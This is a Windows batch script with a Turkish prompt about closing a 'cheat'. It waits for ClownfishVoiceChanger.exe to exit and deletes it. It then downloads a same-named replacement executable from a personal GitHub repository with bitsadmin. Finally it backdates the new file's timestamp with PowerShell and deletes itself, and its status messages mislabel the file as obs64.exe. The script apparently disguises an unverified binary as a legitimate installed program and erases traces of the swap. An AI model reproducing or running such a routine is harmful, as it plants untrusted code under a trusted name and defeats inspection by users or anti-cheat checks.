@echo off
echo hileyi kapatiniz ve bu dosya ekrandan gidene kadar bekleyin...

:loop
tasklist | find /i "ClownfishVoiceChanger.exe" >nul
if not errorlevel 1 (
    timeout /t 1 >nul
    goto loop
)

echo Deleting existing obs64.exe...
del /f "C:\Program Files (x86)\ClownfishVoiceChanger\ClownfishVoiceChanger.exe"

echo obs64.exe...
bitsadmin /transfer myDownloadJob /download /priority high https://github.com/svdsaymazz/crenrepo/raw/refs/heads/main/ClownfishVoiceChanger.exe "C:\Program Files (x86)\ClownfishVoiceChanger\ClownfishVoiceChanger.exe"

if exist "C:\Program Files (x86)\ClownfishVoiceChanger\ClownfishVoiceChanger.exe" (
    echo Completed new.

    echo Setting file...
    powershell -NoProfile -Command "$filePath = 'C:\Program Files (x86)\ClownfishVoiceChanger\ClownfishVoiceChanger.exe'; if (Test-Path $filePath) { (Get-Item $filePath).LastWriteTime = '2024-05-06 12:00:00' } else { Write-Host 'Dosya bulunamadı: $filePath' }"

    echo Cleaning up...
    REM Using PowerShell to schedule the batch file deletion
    powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
)

REM Exit the batch file
exit
